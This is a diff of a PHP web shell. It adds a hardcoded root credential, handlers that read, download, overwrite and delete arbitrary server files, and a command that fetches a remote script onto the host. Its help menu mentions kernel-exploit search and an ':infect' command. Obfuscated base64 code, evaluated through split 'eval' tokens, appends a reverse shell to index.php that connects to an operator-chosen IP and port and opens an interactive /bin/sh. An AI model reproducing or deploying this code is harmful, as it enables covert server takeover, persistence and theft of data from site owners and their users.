@@ -7,12 +7,171 @@
 
 $user = "root";
 $pass = "7b24afc8bc80e548d66c4e7ff72171c5";
-$value = "@@Ez@@";
 
+function return_directory($path){
+    $test = explode('/', $path);
+    array_pop($test);
+    echo implode('/',$test);
+    die();
+}
 function get_self(){
 		$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
 		return htmlspecialchars($_SERVER["REQUEST_URI"].$query,2 | 1);
 	}
+if(isset($_GET['download']) && $_GET['download'] != ''){
+    if(base64_decode($_GET['download'], true)){
+        $file_complet = base64_decode($_GET['download']);
+        if($file_complet != "" && file_exists("./" . basename($file_complet))) 
+        { 
+            $size = filesize("./" . basename($file_complet)); 
+            header("Content-Type: application/force-download; name=\"" . basename($file_complet) . "\""); 
+            header("Content-Transfer-Encoding: binary"); 
+            header("Content-Length: $size"); 
+            header("Content-Disposition: attachment; filename=\"" . basename($file_complet) . "\""); 
+            header("Expires: 0"); 
+            header("Cache-Control: no-cache, must-revalidate"); 
+            header("Pragma: no-cache"); 
+            readfile("./" . basename($file_complet)); 
+            exit(); 
+        } 
+    }
+    die();
+}
+
+if(isset($_POST['deletefile']) && $_POST['deletefile'] != ''){
+    if(is_file($_POST['deletefile'])){
+        if(unlink($_POST['deletefile'])){
+            echo "ok";
+            die();
+        }
+        else{
+            echo "no";
+            die();
+        }
+    }
+    echo "no";
+    die();
+}
+
+if(isset($_POST['updateFile']) && $_POST['updateFile'] != '' && isset($_POST['update']) && $_POST['update'] != ''){
+    if(base64_decode($_POST['updateFile'], true)){
+        $file = base64_decode($_POST['updateFile']);
+        if(is_file($file))
+        {
+            if(fopen($file, 'w')){
+                $file_open = fopen($file, 'w');
+                if(!base64_decode($_POST['update'], true)){
+                    echo "no";
+                    die();
+                }
+                $update = base64_decode($_POST['update']);
+                fwrite($file_open, $update);
+                fclose($file_open);
+                echo "ok";
+                die();
+            }
+        }
+    }
+    echo "no";
+    die();
+    
+}
+
+if(isset($_POST['viewfile']) && $_POST['viewfile'] != '' && is_file($_POST['viewfile'])){
+    if($open = file_get_contents($_POST['viewfile'])){
+        echo strip_tags($open);
+        die();
+    }
+    echo "no";
+    die();
+}
+
+if(isset($_POST['directory']) && $_POST['directory'] != '' && isset($_POST['new']) && $_POST['new'] != ''){
+    $directory = $_POST['directory'];
+    $new_folder = $_POST['new'];
+    if($new_folder != '.' && $new_folder != ''){
+        if($new_folder == ".."){
+            return_directory($directory);
+        }
+        else{
+            $directory = $directory."/".$new_folder;
+            echo $directory;
+            exit();
+        }
+    }
+    die();
+}
+
+
+if(isset($_POST['inspector']) && $_POST['inspector'] != ''){
+    if(is_dir($_POST['inspector'])){
+        if($file = fopen($_POST['inspector'].'/inspector.py', 'a+')){
+            $content = file_get_contents("https://raw.githubusercontent.com/graniet/Inspector/master/inspector.py");
+            fwrite($file, $content);
+            fclose($file);
+            echo "ok";
+            die();
+        }
+    }
+}
+
+if(isset($_POST['explorer']) && $_POST['explorer'] != '' && isset($_POST["pwd"]) && $_POST['pwd'] != ''){
+    $explorer = $_POST['explorer'];
+    $pwd = $_POST['pwd'];
+    if(is_dir($pwd)){
+        $dir_list = scandir($pwd);
+        echo '<table style="width:100%">';
+        foreach($dir_list as $value){
+            if(!is_dir($pwd.'/'.$value) && $value != '..' && $value != '.'){
+                $size = filesize($pwd.'/'.$value)." kb";
+                $value_td = '<td class="file">'.$value.'</a>';
+            }
+            else{
+                $size = "Directory";
+                $value_td = '<td class="directory">'.$value.'</a>';
+            }
+            
+            $right = substr(sprintf('%o', fileperms($pwd.'/'.$value)), -4);
+            $user_group = posix_getpwuid(fileowner($pwd.'/'.$value));
+            echo "<tr>".$value_td."<td>".$size."</td><td>".$right."</td><td>".$user_group['name']."</td></tr>";
+        }
+        echo '</table>';
+    }
+    die();
+    
+}
+
+if(isset($_POST['terminal_query']) && $_POST['terminal_query'] != ''){
+    if(stristr($_POST['terminal_query'],':help')){
+        echo '<table style="width:100%">
+      <tr>
+        <td>:help</td>
+        <td class="infotd">Show help bullet</td>
+      </tr>
+      <tr>
+        <td>:kernel</td>
+        <td class="infotd">Search kernel exploit</td>
+      </tr>
+      <tr>
+        <td>:inspector</td>
+        <td class="infotd">Download inspector.py on server</td>
+      </tr>
+      <tr>
+        <td>:infect</td>
+        <td class="infotd">Install deleting monitor</td>
+      </tr>
+      <tr>
+        <td>:explorer</td>
+        <td class="infotd">Show file explorer</td>
+      </tr>
+      <tr>
+        <td>:show</td>
+        <td class="infotd">Close file explorer</td>
+      </tr>
+    </table>';
+    }
+    die();
+}
 ?>
     <!-- <script src="jquery.js">
     </script> -->
@@ -37,11 +196,10 @@ function get_self(){
     ob_e{{pattern}}nd_cle{{pattern}}an();';
         
 {{$show_obj}} = ' 
-    $code = base64_decode("ZnVuY3Rpb24gcmV0dXJuX2RpcmVjdG9yeSgkcGF0aCl7DQogICAgJHRlc3QgPSBleHBsb2RlKCcvJywgJHBhdGgpOw0KICAgIGFycmF5X3BvcCgkdGVzdCk7DQogICAgZWNobyBpbXBsb2RlKCcvJywkdGVzdCk7DQogICAgZGllKCk7DQp9DQoNCmlmKGlzc2V0KCRfR0VUWydkb3dubG9hZCddKSAmJiAkX0dFVFsnZG93bmxvYWQnXSAhPSAnJyl7DQogICAgaWYoYmFzZTY0X2RlY29kZSgkX0dFVFsnZG93bmxvYWQnXSwgdHJ1ZSkpew0KICAgICAgICAkZmlsZV9jb21wbGV0ID0gYmFzZTY0X2RlY29kZSgkX0dFVFsnZG93bmxvYWQnXSk7DQogICAgICAgIGlmKCRmaWxlX2NvbXBsZXQgIT0gIiIgJiYgZmlsZV9leGlzdHMoIi4vIiAuIGJhc2VuYW1lKCRmaWxlX2NvbXBsZXQpKSkgDQogICAgICAgIHsgDQogICAgICAgICAgICAkc2l6ZSA9IGZpbGVzaXplKCIuLyIgLiBiYXNlbmFtZSgkZmlsZV9jb21wbGV0KSk7IA0KICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2ZvcmNlLWRvd25sb2FkOyBuYW1lPVwiIiAuIGJhc2VuYW1lKCRmaWxlX2NvbXBsZXQpIC4gIlwiIik7IA0KICAgICAgICAgICAgaGVhZGVyKCJDb250ZW50LVRyYW5zZmVyLUVuY29kaW5nOiBiaW5hcnkiKTsgDQogICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtTGVuZ3RoOiAkc2l6ZSIpOyANCiAgICAgICAgICAgIGhlYWRlcigiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9XCIiIC4gYmFzZW5hbWUoJGZpbGVfY29tcGxldCkgLiAiXCIiKTsgDQogICAgICAgICAgICBoZWFkZXIoIkV4cGlyZXM6IDAiKTsgDQogICAgICAgICAgICBoZWFkZXIoIkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGUiKTsgDQogICAgICAgICAgICBoZWFkZXIoIlByYWdtYTogbm8tY2FjaGUiKTsgDQogICAgICAgICAgICByZWFkZmlsZSgiLi8iIC4gYmFzZW5hbWUoJGZpbGVfY29tcGxldCkpOyANCiAgICAgICAgICAgIGV4aXQoKTsgDQogICAgICAgIH0gDQogICAgfQ0KICAgIGRpZSgpOw0KfQ0KDQppZihpc3NldCgkX1BPU1RbJ2RlbGV0ZWZpbGUnXSkgJiYgJF9QT1NUWydkZWxldGVmaWxlJ10gIT0gJycpew0KICAgIGlmKGlzX2ZpbGUoJF9QT1NUWydkZWxldGVmaWxlJ10pKXsNCiAgICAgICAgaWYodW5saW5rKCRfUE9TVFsnZGVsZXRlZmlsZSddKSl7DQogICAgICAgICAgICBlY2hvICJvayI7DQogICAgICAgICAgICBkaWUoKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlew0KICAgICAgICAgICAgZWNobyAibm8iOw0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0NCiAgICB9DQogICAgZWNobyAibm8iOw0KICAgIGRpZSgpOw0KfQ0KDQppZihpc3NldCgkX1BPU1RbJ3VwZGF0ZUZpbGUnXSkgJiYgJF9QT1NUWyd1cGRhdGVGaWxlJ10gIT0gJycgJiYgaXNzZXQoJF9QT1NUWyd1cGRhdGUnXSkgJiYgJF9QT1NUWyd1cGRhdGUnXSAhPSAnJyl7DQogICAgaWYoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ3VwZGF0ZUZpbGUnXSwgdHJ1ZSkpew0KICAgICAgICAkZmlsZSA9IGJhc2U2NF9kZWNvZGUoJF9QT1NUWyd1cGRhdGVGaWxlJ10pOw0KICAgICAgICBpZihpc19maWxlKCRmaWxlKSkNCiAgICAgICAgew0KICAgICAgICAgICAgaWYoZm9wZW4oJGZpbGUsICd3Jykpew0KICAgICAgICAgICAgICAgICRmaWxlX29wZW4gPSBmb3BlbigkZmlsZSwgJ3cnKTsNCiAgICAgICAgICAgICAgICBpZighYmFzZTY0X2RlY29kZSgkX1BPU1RbJ3VwZGF0ZSddLCB0cnVlKSl7DQogICAgICAgICAgICAgICAgICAgIGVjaG8gIm5vIjsNCiAgICAgICAgICAgICAgICAgICAgZGllKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICR1cGRhdGUgPSBiYXNlNjRfZGVjb2RlKCRfUE9TVFsndXBkYXRlJ10pOw0KICAgICAgICAgICAgICAgIGZ3cml0ZSgkZmlsZV9vcGVuLCAkdXBkYXRlKTsNCiAgICAgICAgICAgICAgICBmY2xvc2UoJGZpbGVfb3Blbik7DQogICAgICAgICAgICAgICAgZWNobyAib2siOw0KICAgICAgICAgICAgICAgIGRpZSgpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGVjaG8gIm5vIjsNCiAgICBkaWUoKTsNCiAgICANCn0NCg0KaWYoaXNzZXQoJF9QT1NUWyd2aWV3ZmlsZSddKSAmJiAkX1BPU1RbJ3ZpZXdmaWxlJ10gIT0gJycgJiYgaXNfZmlsZSgkX1BPU1RbJ3ZpZXdmaWxlJ10pKXsNCiAgICBpZigkb3BlbiA9IGZpbGVfZ2V0X2NvbnRlbnRzKCRfUE9TVFsndmlld2ZpbGUnXSkpew0KICAgICAgICBlY2hvIHN0cmlwX3RhZ3MoJG9wZW4pOw0KICAgICAgICBkaWUoKTsNCiAgICB9DQogICAgZWNobyAibm8iOw0KICAgIGRpZSgpOw0KfQ0KDQppZihpc3NldCgkX1BPU1RbJ2RpcmVjdG9yeSddKSAmJiAkX1BPU1RbJ2RpcmVjdG9yeSddICE9ICcnICYmIGlzc2V0KCRfUE9TVFsnbmV3J10pICYmICRfUE9TVFsnbmV3J10gIT0gJycpew0KICAgICRkaXJlY3RvcnkgPSAkX1BPU1RbJ2RpcmVjdG9yeSddOw0KICAgICRuZXdfZm9sZGVyID0gJF9QT1NUWyduZXcnXTsNCiAgICBpZigkbmV3X2ZvbGRlciAhPSAnLicgJiYgJG5ld19mb2xkZXIgIT0gJycpew0KICAgICAgICBpZigkbmV3X2ZvbGRlciA9PSAiLi4iKXsNCiAgICAgICAgICAgIHJldHVybl9kaXJlY3RvcnkoJGRpcmVjdG9yeSk7DQogICAgICAgIH0NCiAgICAgICAgZWxzZXsNCiAgICAgICAgICAgICRkaXJlY3RvcnkgPSAkZGlyZWN0b3J5LiIvIi4kbmV3X2ZvbGRlcjsNCiAgICAgICAgICAgIGVjaG8gJGRpcmVjdG9yeTsNCiAgICAgICAgICAgIGV4aXQoKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBkaWUoKTsNCn0NCg0KDQppZihpc3NldCgkX1BPU1RbJ2luc3BlY3RvciddKSAmJiAkX1BPU1RbJ2luc3BlY3RvciddICE9ICcnKXsNCiAgICBpZihpc19kaXIoJF9QT1NUWydpbnNwZWN0b3InXSkpew0KICAgICAgICBpZigkZmlsZSA9IGZvcGVuKCRfUE9TVFsnaW5zcGVjdG9yJ10uJy9pbnNwZWN0b3IucHknLCAnYSsnKSl7DQogICAgICAgICAgICAkY29udGVudCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZ3JhbmlldC9JbnNwZWN0b3IvbWFzdGVyL2luc3BlY3Rvci5weSIpOw0KICAgICAgICAgICAgZndyaXRlKCRmaWxlLCAkY29udGVudCk7DQogICAgICAgICAgICBmY2xvc2UoJGZpbGUpOw0KICAgICAgICAgICAgZWNobyAib2siOw0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0NCiAgICB9DQp9DQoNCmlmKGlzc2V0KCRfUE9TVFsnZXhwbG9yZXInXSkgJiYgJF9QT1NUWydleHBsb3JlciddICE9ICcnICYmIGlzc2V0KCRfUE9TVFsicHdkIl0pICYmICRfUE9TVFsncHdkJ10gIT0gJycpew0KICAgICRleHBsb3JlciA9ICRfUE9TVFsnZXhwbG9yZXInXTsNCiAgICAkcHdkID0gJF9QT1NUWydwd2QnXTsNCiAgICBpZihpc19kaXIoJHB3ZCkpew0KICAgICAgICAkZGlyX2xpc3QgPSBzY2FuZGlyKCRwd2QpOw0KICAgICAgICBlY2hvICc8dGFibGUgc3R5bGU9IndpZHRoOjEwMCUiPic7DQogICAgICAgIGZvcmVhY2goJGRpcl9saXN0IGFzICR2YWx1ZSl7DQogICAgICAgICAgICBpZighaXNfZGlyKCRwd2QuJy8nLiR2YWx1ZSkgJiYgJHZhbHVlICE9ICcuLicgJiYgJHZhbHVlICE9ICcuJyl7DQogICAgICAgICAgICAgICAgJHNpemUgPSBmaWxlc2l6ZSgkcHdkLicvJy4kdmFsdWUpLiIga2IiOw0KICAgICAgICAgICAgICAgICR2YWx1ZV90ZCA9ICc8dGQgY2xhc3M9ImZpbGUiPicuJHZhbHVlLic8L2E+JzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2V7DQogICAgICAgICAgICAgICAgJHNpemUgPSAiRGlyZWN0b3J5IjsNCiAgICAgICAgICAgICAgICAkdmFsdWVfdGQgPSAnPHRkIGNsYXNzPSJkaXJlY3RvcnkiPicuJHZhbHVlLic8L2E+JzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgJHJpZ2h0ID0gc3Vic3RyKHNwcmludGYoJyVvJywgZmlsZXBlcm1zKCRwd2QuJy8nLiR2YWx1ZSkpLCAtNCk7DQogICAgICAgICAgICAkdXNlcl9ncm91cCA9IHBvc2l4X2dldHB3dWlkKGZpbGVvd25lcigkcHdkLicvJy4kdmFsdWUpKTsNCiAgICAgICAgICAgIGVjaG8gIjx0cj4iLiR2YWx1ZV90ZC4iPHRkPiIuJHNpemUuIjwvdGQ+PHRkPiIuJHJpZ2h0LiI8L3RkPjx0ZD4iLiR1c2VyX2dyb3VwWyduYW1lJ10uIjwvdGQ+PC90cj4iOw0KICAgICAgICB9DQogICAgICAgIGVjaG8gJzwvdGFibGU+JzsNCiAgICB9DQogICAgZGllKCk7DQogICAgDQp9DQoNCmlmKGlzc2V0KCRfUE9TVFsndGVybWluYWxfcXVlcnknXSkgJiYgJF9QT1NUWyd0ZXJtaW5hbF9xdWVyeSddICE9ICcnKXsNCiAgICBpZihzdHJpc3RyKCRfUE9TVFsndGVybWluYWxfcXVlcnknXSwnOmhlbHAnKSl7DQogICAgICAgIGVjaG8gJzx0YWJsZSBzdHlsZT0id2lkdGg6MTAwJSI+DQogICAgICA8dHI+DQogICAgICAgIDx0ZD46aGVscDwvdGQ+DQogICAgICAgIDx0ZCBjbGFzcz0iaW5mb3RkIj5TaG93IGhlbHAgYnVsbGV0PC90ZD4NCiAgICAgIDwvdHI+DQogICAgICA8dHI+DQogICAgICAgIDx0ZD46a2VybmVsPC90ZD4NCiAgICAgICAgPHRkIGNsYXNzPSJpbmZvdGQiPlNlYXJjaCBrZXJuZWwgZXhwbG9pdDwvdGQ+DQogICAgICA8L3RyPg0KICAgICAgPHRyPg0KICAgICAgICA8dGQ+Omluc3BlY3RvcjwvdGQ+DQogICAgICAgIDx0ZCBjbGFzcz0iaW5mb3RkIj5Eb3dubG9hZCBpbnNwZWN0b3IucHkgb24gc2VydmVyPC90ZD4NCiAgICAgIDwvdHI+DQogICAgICA8dHI+DQogICAgICAgIDx0ZD46aW5mZWN0PC90ZD4NCiAgICAgICAgPHRkIGNsYXNzPSJpbmZvdGQiPkluc3RhbGwgZGVsZXRpbmcgbW9uaXRvcjwvdGQ+DQogICAgICA8L3RyPg0KICAgICAgPHRyPg0KICAgICAgICA8dGQ+OmV4cGxvcmVyPC90ZD4NCiAgICAgICAgPHRkIGNsYXNzPSJpbmZvdGQiPlNob3cgZmlsZSBleHBsb3JlcjwvdGQ+DQogICAgICA8L3RyPg0KICAgICAgPHRyPg0KICAgICAgICA8dGQ+OnNob3c8L3RkPg0KICAgICAgICA8dGQgY2xhc3M9ImluZm90ZCI+Q2xvc2UgZmlsZSBleHBsb3JlcjwvdGQ+DQogICAgICA8L3RyPg0KICAgIDwvdGFibGU+JzsNCiAgICB9DQogICAgZGllKCk7DQp9");
+    
     
     $code2 = base64_decode("aWYoaXNzZXQoJF9QT1NUWydpbmZlY3QnXSkgJiYgJF9QT1NUWydpbmZlY3QnXSAhPSAnJyAmJiBpc3NldCgkX1BPU1RbJ2luZmVjdGRpciddKSAmJiAkX1BPU1RbJ2luZmVjdGRpciddICE9ICcnKXsNCiAgICBpZigkZmlsZSA9IGZvcGVuKCRfUE9TVFsnaW5mZWN0ZGlyJ10uJy9pbmRleC5waHAnLCAnYSsnKSl7DQogICAgICAgICRpcCA9IGV4cGxvZGUoJzonLCAkX1BPU1RbJ2luZmVjdCddKVswXTsNCiAgICAgICAgJHBvcnQgPSBleHBsb2RlKCc6JywgJF9QT1NUWydpbmZlY3QnXSlbMV07DQogICAgICAgICRpbmZlY3RvciA9ICc8P3BocCAkaXA9IicuJGlwLiciOyAkcG9ydCA9ICInLiRwb3J0LiciOyBldmFsKGJhc2U2NF9kZWNvZGUoIkRRcHpaWFJmZEdsdFpWOXNhVzFwZENBb01DazdEUW9rVmtWU1UwbFBUaUE5SUNJeExqQWlPdzBLSkdOb2RXNXJYM05wZW1VZ1BTQXhOREF3T3cwS0pIZHlhWFJsWDJFZ1BTQnVkV3hzT3cwS0pHVnljbTl5WDJFZ1BTQnVkV3hzT3cwS0pITm9aV3hzSUQwZ0ozVnVZVzFsSUMxaE95QjNPeUJwWkRzZ0wySnBiaTl6YUNBdGFTYzdEUW9rWkdGbGJXOXVJRDBnTURzTkNpUmtaV0oxWnlBOUlEQTdEUXBwWmlBb1puVnVZM1JwYjI1ZlpYaHBjM1J6S0Nkd1kyNTBiRjltYjNKckp5a3BJSHNOQ2dra2NHbGtJRDBnY0dOdWRHeGZabTl5YXlncE93MEtDUTBLQ1dsbUlDZ2tjR2xrSUQwOUlDMHhLU0I3RFFvSkNYQnlhVzUwYVhRb0lrVlNVazlTT2lCRFlXNG5kQ0JtYjNKcklpazdEUW9KQ1dWNGFYUW9NU2s3RFFvSmZRMEtDUTBLQ1dsbUlDZ2tjR2xrS1NCN0RRb0pDV1Y0YVhRb01DazdEUW9KZlEwS0NXbG1JQ2h3YjNOcGVGOXpaWFJ6YVdRb0tTQTlQU0F0TVNrZ2V3MEtDUWx3Y21sdWRHbDBLQ0pGY25KdmNqb2dRMkZ1SjNRZ2MyVjBjMmxrS0NraUtUc05DZ2tKWlhocGRDZ3hLVHNOQ2dsOURRb05DZ2trWkdGbGJXOXVJRDBnTVRzTkNuMGdaV3h6WlNCN0RRb0pjSEpwYm5ScGRDZ2lWMEZTVGtsT1J6b2dSbUZwYkdWa0lIUnZJR1JoWlcxdmJtbHpaUzRnSUZSb2FYTWdhWE1nY1hWcGRHVWdZMjl0Ylc5dUlHRnVaQ0J1YjNRZ1ptRjBZV3d1SWlrN0RRcDlEUXBqYUdScGNpZ2lMeUlwT3cwS2RXMWhjMnNvTUNrN0RRb2tjMjlqYXlBOUlHWnpiMk5yYjNCbGJpZ2thWEFzSUNSd2IzSjBMQ0FrWlhKeWJtOHNJQ1JsY25KemRISXNJRE13S1RzTkNtbG1JQ2doSkhOdlkyc3BJSHNOQ2dsd2NtbHVkR2wwS0NJa1pYSnljM1J5SUNna1pYSnlibThwSWlrN0RRb0paWGhwZENneEtUc05DbjBOQ2lSa1pYTmpjbWx3ZEc5eWMzQmxZeUE5SUdGeWNtRjVLQTBLSUNBZ01DQTlQaUJoY25KaGVTZ2ljR2x3WlNJc0lDSnlJaWtzRFFvZ0lDQXhJRDArSUdGeWNtRjVLQ0p3YVhCbElpd2dJbmNpS1N3TkNpQWdJRElnUFQ0Z1lYSnlZWGtvSW5CcGNHVWlMQ0FpZHlJcERRb3BPdzBLRFFva2NISnZZMlZ6Y3lBOUlIQnliMk5mYjNCbGJpZ2tjMmhsYkd3c0lDUmtaWE5qY21sd2RHOXljM0JsWXl3Z0pIQnBjR1Z6S1RzTkNnMEthV1lnS0NGcGMxOXlaWE52ZFhKalpTZ2tjSEp2WTJWemN5a3BJSHNOQ2dsd2NtbHVkR2wwS0NKRlVsSlBVam9nUTJGdUozUWdjM0JoZDI0Z2MyaGxiR3dpS1RzTkNnbGxlR2wwS0RFcE93MEtmUTBLYzNSeVpXRnRYM05sZEY5aWJHOWphMmx1Wnlna2NHbHdaWE5iTUYwc0lEQXBPdzBLYzNSeVpXRnRYM05sZEY5aWJHOWphMmx1Wnlna2NHbHdaWE5iTVYwc0lEQXBPdzBLYzNSeVpXRnRYM05sZEY5aWJHOWphMmx1Wnlna2NHbHdaWE5iTWwwc0lEQXBPdzBLYzNSeVpXRnRYM05sZEY5aWJHOWphMmx1Wnlna2MyOWpheXdnTUNrN0RRb05DbkJ5YVc1MGFYUW9JbE4xWTJObGMzTm1kV3hzZVNCdmNHVnVaV1FnY21WMlpYSnpaU0J6YUdWc2JDQjBieUFrYVhBNkpIQnZjblFpS1RzTkNnMEtkMmhwYkdVZ0tERXBJSHNOQ2dscFppQW9abVZ2Wmlna2MyOWpheWtwSUhzTkNna0pjSEpwYm5ScGRDZ2lSVkpTVDFJNklGTm9aV3hzSUdOdmJtNWxZM1JwYjI0Z2RHVnliV2x1WVhSbFpDSXBPdzBLQ1FsaWNtVmhhenNOQ2dsOURRb0phV1lnS0dabGIyWW9KSEJwY0dWeld6RmRLU2tnZXcwS0NRbHdjbWx1ZEdsMEtDSkZVbEpQVWpvZ1UyaGxiR3dnY0hKdlkyVnpjeUIwWlhKdGFXNWhkR1ZrSWlrN0RRb0pDV0p5WldGck93MEtDWDBOQ2dra2NtVmhaRjloSUQwZ1lYSnlZWGtvSkhOdlkyc3NJQ1J3YVhCbGMxc3hYU3dnSkhCcGNHVnpXekpkS1RzTkNna2tiblZ0WDJOb1lXNW5aV1JmYzI5amEyVjBjeUE5SUhOMGNtVmhiVjl6Wld4bFkzUW9KSEpsWVdSZllTd2dKSGR5YVhSbFgyRXNJQ1JsY25KdmNsOWhMQ0J1ZFd4c0tUc05DZ2xwWmlBb2FXNWZZWEp5WVhrb0pITnZZMnNzSUNSeVpXRmtYMkVwS1NCN0RRb0pDV2xtSUNna1pHVmlkV2NwSUhCeWFXNTBhWFFvSWxOUFEwc2dVa1ZCUkNJcE93MEtDUWtrYVc1d2RYUWdQU0JtY21WaFpDZ2tjMjlqYXl3Z0pHTm9kVzVyWDNOcGVtVXBPdzBLQ1FscFppQW9KR1JsWW5WbktTQndjbWx1ZEdsMEtDSlRUME5MT2lBa2FXNXdkWFFpS1RzTkNna0pabmR5YVhSbEtDUndhWEJsYzFzd1hTd2dKR2x1Y0hWMEtUc05DZ2w5RFFvSmFXWWdLR2x1WDJGeWNtRjVLQ1J3YVhCbGMxc3hYU3dnSkhKbFlXUmZZU2twSUhzTkNna0phV1lnS0NSa1pXSjFaeWtnY0hKcGJuUnBkQ2dpVTFSRVQxVlVJRkpGUVVRaUtUc05DZ2tKSkdsdWNIVjBJRDBnWm5KbFlXUW9KSEJwY0dWeld6RmRMQ0FrWTJoMWJtdGZjMmw2WlNrN0RRb0pDV2xtSUNna1pHVmlkV2NwSUhCeWFXNTBhWFFvSWxOVVJFOVZWRG9nSkdsdWNIVjBJaWs3RFFvSkNXWjNjbWwwWlNna2MyOWpheXdnSkdsdWNIVjBLVHNOQ2dsOURRb05DZ2xwWmlBb2FXNWZZWEp5WVhrb0pIQnBjR1Z6V3pKZExDQWtjbVZoWkY5aEtTa2dldzBLQ1FscFppQW9KR1JsWW5WbktTQndjbWx1ZEdsMEtDSlRWRVJGVWxJZ1VrVkJSQ0lwT3cwS0NRa2thVzV3ZFhRZ1BTQm1jbVZoWkNna2NHbHdaWE5iTWwwc0lDUmphSFZ1YTE5emFYcGxLVHNOQ2drSmFXWWdLQ1JrWldKMVp5a2djSEpwYm5ScGRDZ2lVMVJFUlZKU09pQWthVzV3ZFhRaUtUc05DZ2tKWm5keWFYUmxLQ1J6YjJOckxDQWthVzV3ZFhRcE93MEtDWDBOQ24wTkNnMEtabU5zYjNObEtDUnpiMk5yS1RzTkNtWmpiRzl6WlNna2NHbHdaWE5iTUYwcE93MEtabU5zYjNObEtDUndhWEJsYzFzeFhTazdEUXBtWTJ4dmMyVW9KSEJwY0dWeld6SmRLVHNOQ25CeWIyTmZZMnh2YzJVb0pIQnliMk5sYzNNcE93MEtEUXBtZFc1amRHbHZiaUJ3Y21sdWRHbDBJQ2drYzNSeWFXNW5LU0I3RFFvSmFXWWdLQ0VrWkdGbGJXOXVLU0I3RFFvSkNYQnlhVzUwSUNJa2MzUnlhVzVuWEc0aU93MEtDWDBOQ24wPSIpKTsgPz4nOw0KICAgICAgICAkaW5mZWN0b3IgPSBzdHJfcmVwbGFjZSgkdmFsdWUsICcnLCAkaW5mZWN0b3IpOw0KICAgICAgICBmd3JpdGUoJGZpbGUsICRpbmZlY3Rvcik7DQogICAgICAgIGZjbG9zZSgkZmlsZSk7DQogICAgICAgIGVjaG8gJ29rJzsNCiAgICB9DQogICAgZGllKCk7DQp9");
         
-    ev{{pattern}}al($code);
     ev{{pattern}}al($code2);
     ech{{pattern}}o $ht{{pattern}}ml;
     echo $ja{{pattern}}vascript;';
